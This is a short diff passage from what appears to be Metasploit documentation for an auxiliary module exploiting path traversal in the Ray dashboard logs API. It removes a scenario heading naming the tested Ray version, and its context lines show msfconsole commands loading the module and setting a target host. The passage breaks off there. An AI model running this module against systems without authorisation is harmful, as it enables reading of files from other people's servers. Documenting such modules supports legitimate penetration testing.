@@ -35,7 +35,6 @@ This module was successfully tested on:
 
 ## Scenarios
 
-### Ray (v2.6.3) installed with Docker on Kali Linux 6.6.15
 ```
 msf > use auxiliary/gather/ray_dashboard_logs_api_path_traversal
 msf auxiliary(gather/ray_dashboard_logs_api_path_traversal) > set RHOSTS 192.168.1.30
